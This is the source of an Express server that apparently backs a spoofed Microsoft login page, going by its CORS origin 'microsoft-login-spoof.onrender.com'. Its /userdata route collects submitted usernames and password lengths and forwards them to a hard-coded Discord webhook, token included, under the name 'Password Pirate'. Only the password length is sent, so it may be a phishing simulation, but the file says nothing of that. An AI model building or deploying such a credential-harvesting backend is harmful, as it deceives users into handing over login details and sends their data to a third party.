import express from "express";
import fs from "fs";
import cors from 'cors';
import {json} from "express";

const app = express();
app.use(cors({ origin: 'https://microsoft-login-spoof.onrender.com' }));

// app.use((req, res, next) => {
//     res.header('Access-Control-Allow-Origin', '*'); // Allow all origins
//     res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
//     res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
//     next();
// });

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.use(express.static(__dirname + "/public/live"));

app.get("/live", (req, res, next) => {
    res.sendFile(__dirname + "/public/live/index.html");
});

app.post("/userdata", (req, res, next) => {
    console.log("POST /userdata");
    try {
        var data = `user: ${req.body.userName} passwordLength: ${req.body.passwordLength}`
        console.log(data);

        // send webhook to discord
        const axios = require('axios');

        axios.post('https://discord.com/api/webhooks/1305606177777778788/InbjBbuYwVV6R5DvN3Bne305sSGI8CTmMBKaolmi9VITc9hLai3dbnPgBkFZ22JjchDo', {
            content: data,
            username: 'Password Pirate'
        });
        res.sendStatus(200);
        return;
    } catch(err) {
        console.log(err);
        res.sendStatus(404);
        return;
    }
});

app.get("/ping", (req, res, next) => {
    res.send("pong");
});

// const port: number = process.env.PORT || 5000; cast to number
const port: number = process.env.PORT ? parseInt(process.env.PORT) : 5000; // cast to number
app.listen(port, "0.0.0.0", () => console.log(`Server running on port ${port}`));
